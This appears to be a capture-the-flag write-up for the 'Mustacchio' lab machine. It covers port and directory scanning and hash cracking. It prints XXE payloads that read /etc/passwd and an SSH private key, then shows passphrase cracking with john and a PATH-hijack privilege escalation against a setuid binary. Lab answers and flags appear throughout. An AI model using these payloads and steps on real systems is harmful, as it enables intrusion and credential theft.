# Mustacchio


1. Enumerate with nmap
```
root@ip-10-10-55-115:~# sudo nmap -sS -A 10.10.129.128

Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-01 18:31 BST
Nmap scan report for ip-10-10-129-128.eu-west-1.compute.internal (10.10.129.128)
Host is up (0.00046s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
MAC Address: 02:C5:85:FF:9F:A3 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.13
OS details: Linux 3.13
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms ip-10-10-129-128.eu-west-1.compute.internal (10.10.129.128)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.67 seconds
```

2. Brute force directories with gobuster
```
root@ip-10-10-55-115:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.129.128/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.129.128/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/05/01 18:32:34 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/custom (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
===============================================================
2022/05/01 18:32:36 Finished
===============================================================
```

3. The only interesting file found is `/custom/js/users.bak`. It's a sqlite database, and we can view it by using `sqlite3` or GUI like [Sqlitebrowser](https://sqlitebrowser.org/). We find the username `admin` and password `1868e36a6d2b17d4c2745f1659433a54d4bc5f4b`

4. Using [crackstation](https://crackstation.net/) we find that the password was hashed with sha1 and the original value was `bulldog19`

5. If we try to login to ssh with user `admin` and password `bulldog19` we find that we need a key file to login, which means that the credentials we found aren't for ssh

6. Use nmap to scan ports 1-10000 to find an admin page
```
root@ip-10-10-55-115:~# sudo nmap -sS -A -p 5000-10000 10.10.129.128

Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-01 18:55 BST
Nmap scan report for ip-10-10-129-128.eu-west-1.compute.internal (10.10.129.128)
Host is up (0.00048s latency).
Not shown: 5000 filtered ports
PORT     STATE SERVICE VERSION
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
MAC Address: 02:C5:85:FF:9F:A3 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.13
OS details: Linux 3.13
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.48 ms ip-10-10-129-128.eu-west-1.compute.internal (10.10.129.128)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.96 seconds
```

7. Log in to the page with the credentials and we find an input box that takes xml. Whenever something is entered it alerts us to `Insert XML Code!`. Use burp suite to catch the response to the request
```
HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Sun, 01 May 2022 18:29:25 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 1993

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mustacchio | Admin Page</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous">
    <link rel="stylesheet" href="assets/css/home.css">
    <script type="text/javascript">
      //document.cookie = "Example=/auth/dontforget.bak"; 
      function checktarea() {
      let tbox = document.getElementById("box").value;
      if (tbox == null || tbox.length == 0) {
        alert("Insert XML Code!")
      }
  }
</script>
</head>
<body>

    <!-- Barry, you can now SSH in using your key!-->

    <img id="folhas" src="assets/imgs/pexels-alexander-tiupa-192136.jpg" alt="">

    <nav class="position-fixed top-0 w-100 m-auto ">
        <ul class="d-flex flex-row align-items-center justify-content-between h-100">
            <li>AdminPanel</li>
            <li class="mt-auto mb-auto"><a href="auth/logout.php">Logout</a></li>
        </ul>
    </nav>

    <section id="add-comment" class="container-fluid d-flex flex-column align-items-center justify-content-center">
        <h3>Add a comment on the website.</h3>

        <form action="" method="post" class="container d-flex flex-column align-items-center justify-content-center">
            <textarea id="box" name="xml" rows="10" cols="50"></textarea><br/>
            <input type="submit" id="sub" onclick="checktarea()" value="Submit"/>
        </form>
            </section>



<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/js/bootstrap.bundle.min.js" integrity="sha384-JEW9xMcG8R+pH31jmWH6WWP0WintQrMb4s7ZOdauHnUtxwoG2vI5DkLtS3qm9Ekf" crossorigin="anonymous"></script>
</body>
</html>
```

8. The comment `//document.cookie = "Example=/auth/dontforget.bak";` guides us to the file `dontforget.bak`. We also see the comment `<!-- Barry, you can now SSH in using your key!-->`
```
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could\u2019ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could\u2019ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

9. If we try using the template in the submission box, we see that the contents of the xml are printed out on the screen. We can use a [XXE injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-xxe-to-retrieve-fileshttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-xxe-to-retrieve-files) to print out the contents of files on the system
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&file;</com>
</comment>
```
```
Comment :
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false joe:x:1002:1002::/home/joe:/bin/bash
```

10. We can read barry's ssh private key with this, and if we check the source code of the page we'll find the private key in the correct format
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [<!ENTITY file SYSTEM "file:///home/barry/.ssh/id_rsa">]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&file;</com>
</comment>
```
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----
```

11. If we try to login with `ssh -i id_rsa barry@<ip address>` we find that it's protected with a passphrase. Use ssh2john to create a hash of the key and then crack it with john the ripper using the rockyou wordlist `john --wordlist=/usr/share/wordlists/rockyou.txt hash`. Then login with the passphrase
```
root@ip-10-10-129-81:~/Downloads# ./ssh2john.py id_rsa > hash
root@ip-10-10-129-81:~/Downloads# cat hash
id_rsa:$sshng$1$16$D137279D69A43E71BB7FCB87FC61D25E$1200$8ea0c93fe6e552bfb1325012601f6de20172325f55ba01d0240ca519913a27f6f59c6e7b78660e33cc1d66f54c1ab7cd6cd2556578fa565b9932bf6e117f18e2f0b66edd8a081885836db807ad73e17268896437e46fdb5ecd591b15e8348314319749ec31f5936dbaa9032d9b8abde8c64a110e5915ad37d92a21b5f0cfb288a6ffb74d6a910eba3466c3eaee044eb99767fdc1909f0da119bf1092c901432630579b4ee6a9f489ddde7d77086b1bd76eaeebb5fda95452f23f8ccf1b392d8359fc9fde79185d6c83e123c249329ccb853d616dba2c6eca3052dc59c1b40f797a9750f0c9e50166673c500b90147ec436c36cc15ca492bde0b3097604c4ea1b3d5bc3fd6039d0a3dc1c9cd4b27a9915977c3dc74a659c73ff1b1df76f552810ba5ec0f113a5cefae2eff58795c200d527dcac56948fcbdf5e2e777e2a7d8016cb7fab323a8d330c9e15bf0df270e89e4c7e9bea61857b146249a13fbb7af9e2f6732f4287817b5aa736f880397fc90268df0a83d457d8ec00b5d9e51cf4d742adcbc6f1770383ea014289039c65529c69a6be63f122c5534f7d36ef2933c1e8b759595a80c04238efde92861e3569576e1975a93b50eae0b59078f24c750a359541efc78349a9e4a0444bc9f71d6b8f64fdec476584e698a29c763350f8a364e1ca6f946f50a79161eee1420d6a2113fa842e944a678fe4e87880e054b5dc3e7d265bcb08a43a23039f2119ecb5807cefe6283243d61ef2a3992fef317f9e95c65cbe1e3b28d74d978910c7ae414939ab5122bc1a01a7a8826edbf1b57c193e4fe81671e4b9d56af1209ba29a68f0b850f74b65d96955c949d2bb8af0f713c29f5a380cc74cd716ee0c72709f0169226a162679a77a5a2587b4cf7c1bf850e8aeb23c33bb18387b059b8c829343fcb6d2fafa413d1cd7a2d0a55c7e90f7d23b2c8b9008de6109bf191c50f4e80f85d9a64da60d06ec5b324f04e7002b592d9eb519dc61362fb7b633950c64243d552ca6487d82abf9fa6759e8b544a90df5796db376d0947d4bb8592cebf809dd1cf6b696ab7dd0ffb01f68927786cc4acc6095a5cf5dd7152719b04ecf8a979e9f46898a0fd61d3ed0f852fcabe770a1ec28a224db05260e25636b3b5a2025c71f68be924b18cb69ce183c017245540b706910053f19f9e32d452135d7ead8af93adb20d18cfb177f3c1b30db2f18582f40a0d991a78af9b0635eb9aea83e0407d2b9e3446e3ba77b922c0a3674d5813b295a554279b31f2c88bbe922adc4b5699c5e9a6a4da226430843d2346ee90338b5cc380a046a694a253e60fb06420b969423a7191b432fd1729b497d834e6872505724414fdd719731f545e8205871ec37acaaba014d1e9f10196ab27ece3e54858f49401c70a022cc4f6b09a5bd29b76ecedb7687e19590635d874895980102a76ae6304953c1ad15c1b2a61f5c6f77fe0b79e499e0d9246449c315187944bd39fd5d5647d65211f6c7d6a959157ca4933f0720ddd243566bf73ffccac6334f832a41e801929f0e5dec0b481d441ee4510f99f3b9c5226c70f7977156fa195d9be83126fb3af7f6ec052151e794f1cb56b1e94a4663f0e7afb184e6c1a006d1227ee6c4dfcde4b968b1379f2679617488480d30ccb04c2300203eabaf3af9b44477e76b6a3824e91f5e2a048c13b81e543
root@ip-10-10-129-81:~/Downloads# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
urieljames       (id_rsa)
1g 0:00:00:11 84.30% (ETA: 02:11:52) 0.08952g/s 1084Kp/s 1084Kc/s 1084KC/s 58869620..5886829
Session aborted
```

12. Print out `user.txt` to get `62d77a4d5f97d47c5aa38b3b2651b831`

13. We can't communicate with other machines, so we can't run an enumeration script. In joe's home folder we find a binary `live_log` that shows us the logs of requests made to the website. Use the `strings` utility to see what it's doing
```
barry@mustacchio:/home/joe$ strings live_log
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
printf
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
:*3$"
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8060
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
demo.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

14. We see that `tail -f /var/log/nginx/access.log` tail's absolute path isn't specified, and we can abuse it. Create a new binary in barry's directory (we can't create files in joe's folder) and insert `cat /root/root.txt` in it. Then modify the PATH so that our program is in it instead of the actual tail program, and run `live_log`
```
barry@mustacchio:/home/joe$ vim ../barry/tail
barry@mustacchio:/home/joe$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
barry@mustacchio:/home/joe$ which tail
/usr/bin/tail
barry@mustacchio:/home/joe$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/bin:/home/barry
barry@mustacchio:/home/joe$ chmod +x /home/barry/tail
barry@mustacchio:/home/joe$ which tail
/home/barry/tail
barry@mustacchio:/home/joe$ ./live_log
3223581420d906c4dd1a5f9b530393a5
```
